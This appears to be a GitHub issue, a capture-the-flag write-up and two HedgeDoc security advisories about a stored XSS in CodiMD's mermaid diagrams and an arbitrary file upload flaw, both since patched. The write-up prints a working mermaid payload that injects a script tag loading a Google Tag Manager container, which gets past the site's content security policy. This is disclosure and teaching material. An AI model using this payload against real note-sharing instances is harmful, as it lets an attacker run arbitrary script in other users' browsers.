## Description

![@Alemmi](https://avatars.githubusercontent.com/u/24527637?u=227a20e4b2988fda7cf8a16c14d4a5b65ca317dc&v=4&size=48)[Alemmi](https://github.com/Alemmi)opened [on Dec 20, 2020](https://github.com/hackmdio/codimd/issues/1630#issue-771710540)

Hi,

This weekend I played hxpctf, during competition there was a challenge called hackme. It was a Docker with codimd. My solution was unintended: I use google analytics to exploit a stored xss bug in mermaid.

Here is my [PoC](https://github.com/Alemmi/ctf-writeups/blob/main/hxpctf-2020/hackme/solution.md)

The bug seems to be known by the mermaid developers ([issue](https://github.com/mermaid-js/mermaid/issues/869)).

I tryed it on [hackmd.io](https://hackmd.io/) and it works, too.

Hope you can fix soon!

P.S. Now I'm going to reopen the issue in mermaid repository. This is also a duplicate, but the other issues are marked as "solved".

Thanks

Alessandro Mizzaro

# Hackme: Web hard - hxpctf 2020

This year I played hxp ctf w/ [mHACKeroni](https://mhackeroni.it)

## The challenge

The challenge is a [CodiMD](https://github.com/hackmdio/codimd) docker with report uri.
In the challenge, a note called "the-flag" exists and it contents, obv, the fl4g. This challenge is very very intresting, I loved it but the Dockerfile is really B1GG, with my orrible network it took ~15 minutes for build ahahah.

(Solves: 15/1177, Fixed by CodiMD Team after issue [#1630](https://github.com/hackmdio/codimd/issues/1630), CVE-2020-26287)

## The bug

This challenge, obviously, has an XSS vuln mlmlmlml!

Oh sh1t there is a CSP. I took a couple of minutes to analyze it

```
Content-Security-Policy: default-src 'self';script-src 'self' vimeo.com https://gist.github.com www.slideshare.net https://query.yahooapis.com 'unsafe-eval' https://disqus.com https://*.disqus.com https://*.disquscdn.com https://www.google-analytics.com 'nonce-90dfe8a7-eaa5-41a5-a9f2-7d36a6db7ce3' 'sha256-81acLZNZISnyGYZrSuoYhpzwDTTxi7vC1YM4uNxqWaM=';img-src * data:;style-src 'self' 'unsafe-inline' https://github.githubassets.com https://*.disquscdn.com;font-src 'self' data: https://public.slidesharecdn.com https://*.disquscdn.com;object-src *;media-src *;child-src *;connect-src *

```

Eureka: `https://www.google-analytics.com` is enable.

But first I need a method to include some script from google analytics :(

With some osint I find a stored xss bug in [mermeid graph](https://github.com/mermaid-js/mermaid/issues/869).

## IT'S TIME TO EXPLOIT

With google analytics there is a service called "Google Tag Manager". With it I can create cusotm tag and custom javascript code.

First of all I write an XSS payload and create a variable in Google Tag Manager with this paylod.

[![CustomJavascript](/Alemmi/ctf-writeups/raw/main/hxpctf-2020/hackme/images/custom_javascript.png)](/Alemmi/ctf-writeups/blob/main/hxpctf-2020/hackme/images/custom_javascript.png)

Secondly I create a custom Google Universal Analytics Tag ang Google Analytics Settigs that took the custom variable and do something at the page load event

[![Gas](/Alemmi/ctf-writeups/raw/main/hxpctf-2020/hackme/images/gas.png)](/Alemmi/ctf-writeups/blob/main/hxpctf-2020/hackme/images/gas.png)

[![Gaua](/Alemmi/ctf-writeups/raw/main/hxpctf-2020/hackme/images/gaua.png)](/Alemmi/ctf-writeups/blob/main/hxpctf-2020/hackme/images/gaua.png)

Finally I write a new note that trigger the xss bug:

```
```mermaid
graph TD
B --> C{<script src=https://www.google-analytics.com/gtm/js?id=GTM-MLQBR25 ></script>}

```

And I report my note.

The flag:
`hxp{Yo dawg, I heard you like XSS, so I put some DOM injection in your script injection so you can inject scripts while you inject HTML while you inject scripts! Any questions?}`.

Thanks a lot to orgs for the idea and for the other challenges.

# Arbitrary file upload

High

[davidmehren](/davidmehren)
published
GHSA-wcr3-xhv7-8gxc
Dec 27, 2020

## Package

No package listed

## Affected versions

<1.7.1

## Patched versions

1.7.1

## Description

### Impact

An unauthenticated attacker can upload arbitrary files to the upload storage backend including HTML, JS and PHP (see note below) files.

Affected are all versions prior 1.7.1 or commit 90451b7b9380b349c92aa18ade0e2682a6dd2c7a.

### Patches

The problem is patched in HedgeDoc 1.7.1. You should however verify that your uploaded file storage only contains files that are allowed, as uploaded files might still be served.

### Workarounds

As workaround it's possible to block the `/uploadimage` endpoint on your instance using your reverse proxy. And/or restrict MIME-types and file names served from your upload file storage.

### For more information

If you have any questions or comments about this advisory:

* Open an topic on [our community forum](https://community.hedgedoc.org)
* Join our [matrix room](https://chat.hedgedoc.org)

### Credits

Credits go to T. Lambertz who discovered this vulnerability.

### Note on PHP and other CGI renderer for webservers

If the uploaded files are directly served by a webserver that interprets code, such as quite common LAMP installations, this exploit maybe allows to run arbitrary code on your backend. This would increase the rating of this vulnerability to critical. But as such a configuration was never advised and is only a theoretical construct at our current knowledge for deployments in the wild, it was ignored as part of the score calculation.

### Severity

High

### CVE ID

CVE-2020-26286

### Weaknesses

No CWEs

# Stored XSS in mermaid diagrams

High

[davidmehren](/davidmehren)
published
GHSA-g6w6-7xf9-m95p
Dec 27, 2020

## Package

No package listed

## Affected versions

<1.7.1

## Patched versions

1.7.1

## Description

### Impact

An attacker can inject arbitrary `script` tags in HedgeDoc notes using mermaid diagrams. Our content security policy prevents loading scripts from most locations, but `www.google-analytics.com` is allowed. Using Google Tag Manger it is possible to inject arbitrary JavaScript and execute it on page load.

Depending on the configuration of the instance, the attacker may not need authentication to create or edit notes.

### Patches

The problem is patched in HedgeDoc 1.7.1.

### Workarounds

Disallow `www.google-analytics.com` in the `Content-Security-Policy` header. Note that other ways to leverage the `script` tag injection might exist.
